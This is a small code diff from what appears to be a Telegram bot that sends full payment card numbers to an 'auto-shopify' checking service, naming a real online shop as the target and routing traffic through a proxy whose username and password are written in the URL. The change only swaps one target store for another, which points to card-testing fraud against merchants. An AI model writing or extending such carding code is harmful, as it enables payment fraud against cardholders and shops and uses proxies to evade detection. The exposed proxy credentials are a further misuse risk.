@@ -2652,7 +2652,7 @@ async def process_sh(update: Update, context: ContextTypes.DEFAULT_TYPE, payload
         # --- API request ---
         api_url = (
             f"https://auto-shopify-6cz4.onrender.com/index.php"
-            f"?site=https://yogadesignlab.com"
+            f"?site=https://happyhealthyyou.com"
             f"&cc={full_card}"
             f"&proxy=qhlpirsk-238:96zjmb7awmom@p.webshare.io:80"
         )
